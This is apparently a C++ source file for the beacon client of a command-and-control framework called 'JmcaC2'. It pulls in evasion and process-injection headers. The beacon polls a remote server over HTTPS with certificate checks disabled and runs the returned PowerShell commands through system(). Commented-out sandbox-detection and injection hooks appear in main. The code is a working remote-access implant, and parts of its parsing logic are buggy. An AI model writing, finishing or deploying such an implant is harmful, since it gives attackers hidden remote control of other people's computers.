// Authors: Hudson and Isaac
// Date: 11/17/2025
// Description: Beacon client for JmcaC2
// Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe
// Compile: cl  main.cpp /link ws2_32.lib winhttp.lib user32.lib;

#include "evasion.h"
#include "procInjection.h"

using std::string;

const wchar_t* ACCEPTED_MIME_TYPES[] = {
    L"text/plain", L"application/octet-stream", L"text/html", NULL};

void runPSCommand(string command);
int CreateTCPConn();
bool sendHTTPTaskResult();

static std::wstring beaconName = L"";

bool runTask(std::string outBuffer, DWORD dwSize) {
    printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());

    size_t pipePos = outBuffer.find('|');

    if (!pipePos) return false;

    std::string cmd = outBuffer.substr(0, pipePos);

    if (cmd == "powershell")
        runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
    return true;
}

bool PrintWinHttpError(const char* msg) {
    std::cout << msg << " failed: " << GetLastError() << "\n";
    return false;
}

bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
    // WinHTTP > WinINet

    /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
    WinHttpSetOption (user-agent/content-type) ->
    WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/

    // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web

    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return PrintWinHttpError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return PrintWinHttpError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return PrintWinHttpError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return PrintWinHttpError("WinHttpSetOption");

    std::wstring headerString;
    LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;

    if (!beaconName.empty()) {
        headerString = L"BeaconName: " + beaconName + L"\r\n";
        headerPtr = headerString.c_str();
    }

    // should be replaced if POST
    if (!(isRequestSuccessful =
              WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
        return PrintWinHttpError("WinHttpSendRequest");

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return PrintWinHttpError("WinHttpReceiveResponse");

    // extract the beacon name from the response
    if (beaconName.empty()) {
        DWORD size = 0;
        WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"BeaconName",
                            WINHTTP_NO_OUTPUT_BUFFER, &size,
                            WINHTTP_NO_HEADER_INDEX);

        // If size is 0, the header isn't present.
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::wstring buffer(size / sizeof(wchar_t),
                                L'\0');  // allocate correct size

            if (WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM,
                                    L"BeaconName", &buffer[0], &size,
                                    WINHTTP_NO_HEADER_INDEX)) {
                buffer.resize(
                    (size / sizeof(wchar_t)));  // remove terminating null
                wprintf(L"Header value: %s\n", buffer.c_str());
                beaconName = buffer;
            }
        }
    }

    DWORD dwSize = 0;

    while (true) {
        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize) break;
        char* responseBuf = new char[dwSize + 1];
        ZeroMemory(responseBuf, dwSize + 1);

        DWORD dwOut = 0;

        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut)) {
            delete[] responseBuf;
            break;
        }

        // append chunk to output
        char* newBuf = new char[*dwSizeOut + dwOut];
        if (*outBuffer != nullptr) {
            memcpy(newBuf, *outBuffer, *dwSizeOut);
            delete[] (*outBuffer);
        }
        memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);

        *outBuffer = newBuf;
        *dwSizeOut = dwOut;

        delete[] responseBuf;
    }

    if (hHTTPRequest) WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection) WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession) WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

void runPSCommand(std::string command) {
    string powershellPrefix{"powershell -c "};
    system((powershellPrefix + command).c_str());

    // TODO: Make this process injection?
}

void fetchServerCertificate(HINTERNET hConnection) {}

int main(int argc, const char** argv) {
    // Run all checks
    // BOOL cpuOK = checkCPU();
    // BOOL ramOK = checkRAM();
    // BOOL hddOK = checkHDD();
    // BOOL processesOK = checkProcesses();

    // Check if all tests passed
    // if (!cpuOK || !ramOK || !hddOK || !processesOK) {
    //     return 0;
    // }

    char* outBuffer = nullptr;
    DWORD dwSize = 0;

    while (true) {
        if (fetchTasks(&outBuffer, &dwSize)) {
            // TODO: parse tasks and do
            if (dwSize > 0) {
                runTask(outBuffer, dwSize);
                // printf("TASK: %.*s\n", dwSize, outBuffer);
                delete[] outBuffer;
                dwSize = 0;
            }
            // processInject();
            // runPSCommand(argv[1]);
            //  TODO: post results
        }

        // TODO: jitter sleep interval
        Sleep(10000);
    }

    return 0;
}